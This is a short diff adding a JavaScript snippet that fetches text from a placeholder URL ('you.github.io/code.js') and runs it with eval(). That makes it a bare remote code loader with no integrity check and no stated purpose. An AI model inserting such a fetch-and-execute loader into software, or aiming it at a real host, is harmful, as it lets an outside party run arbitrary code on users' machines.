@@ -1,0 +1,17 @@
+let supercoolsite = 'you.github.io/code.js'
+async function fetchCode(url) {
+    try {
+        const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        const code = await response.text();
+        return code;
+    } catch (error) {
+        return null;
+    }
+}
+const codeToExecute = await fetchCode(supercoolsite);
+    if (codeToExecute) {
+        eval(codeToExecute);
+    }
